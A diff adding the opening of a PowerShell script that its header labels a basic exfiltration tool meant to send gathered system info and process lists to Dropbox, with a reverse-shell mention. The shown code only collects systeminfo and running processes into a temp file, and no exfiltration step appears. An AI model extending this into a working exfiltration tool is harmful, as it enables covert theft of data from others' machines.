@@ -1,0 +1,15 @@
+### second project
+### Type: basic EXFIL / POWERSHELL SCRIPT 
+### not for badUSB use
+### Detail: Gathers network info/processes then EXFIL to dropbox. (revers shell)
+
+# (Definitons)
+
+# defining outputfile
+$outputFile = "$env:temp\systeminfo.txt" 
+# gets system information then outputs into txt file
+systeminfo > $outputFile
+# self-explanatory, adds content to the txt file for organization
+Add-Content -Path $outputFile -Value "n===== Running Processes =====n"
+# gets processses list and adds the extra to the txt file; -Append simply does not overwriting it
+Get-Process | Out-File -FilePath $outputFile -Append
